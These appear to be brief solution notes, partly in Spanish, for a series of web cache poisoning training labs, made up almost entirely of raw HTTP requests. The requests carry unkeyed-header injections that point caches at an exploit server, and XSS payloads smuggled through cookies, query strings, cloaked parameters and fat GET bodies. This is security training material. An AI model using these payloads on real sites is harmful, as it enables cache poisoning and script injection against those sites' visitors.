## Lab: Web cache poisoning with an unkeyed header

```
X-Forwarded-Host: exploit-0ac200ee0425602d81955661015e00b4.exploit-server.net/exploit
```

## Lab: Web cache poisoning with an unkeyed cookie 

```
Cookie: session=MEXp83gT9Eq6tyFJkPQloB91eF0VPckF; fehost="}%3balert(1)%3b{"
```

## Lab: Web cache poisoning with multiple headers

Cachear archivo 

```
GET /resources/js/tracking.js HTTP/2
Host: 0a1300d5032fd780816cbb6b00f700dd.web-security-academy.net
X-Forwarded-Schema: nohttp
X-Forwarded-Host: exploit.server
```

## Lab: Targeted web cache poisoning using an unknown header

Identificar el User-Agent, en los comendarios
```
<img src="https://exploit.com/exploit> 
```

Cachear la respuestas 
```
GET /post?postId=1 HTTP/1.1
Host: 0ae1007b0497ac8d81854e970034001d.h1-web-security-academy.net
X-Host: exploit-0a89002e0474ac5d81564df101720021.exploit-server.net
Cookie: session=OqdOItgnx9v12hk8ucC3CMsu2SkT6xAh
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

## Lab: Web cache poisoning via an unkeyed query string

```
GET /?'/><script>alert(1)</script> HTTP/2
Host: 0af80057043f370f81094d1d00140018.web-security-academy.net
Pragma: x-get-cache-key
Content-Length: 0
```

## Lab: Web cache poisoning via an unkeyed query parameter

```
GET /?utm_content='/><script>alert(1)</script> HTTP/2
Host: 0a25004404e41a49810589da005e008c.web-security-academy.net
Pragma: x-get-cache-key
Content-Length: 0
```

## Lab: Parameter cloaking

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=tset;callback=alert(1)%3btest HTTP/2
Host: 0a2a00bb04f545c7802d0de700cb0038.web-security-academy.net
Pragma: x-get-cache-key
Content-Length: 0
```

## Lab: Web cache poisoning via a fat GET request

```
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0aa3002904dd5bd280090d84003200a1.web-security-academy.net
Pragma: x-get-cache-key
Content-Length: 26

callback=alert(1);test
```

## Lab: URL normalization

```
GET /a</p><script>alert(1)</script>a HTTP/1.1
Host: 0a3700680424936c80cc030b001900c5.web-security-academy.net
pragma: x-get-cache-key
```


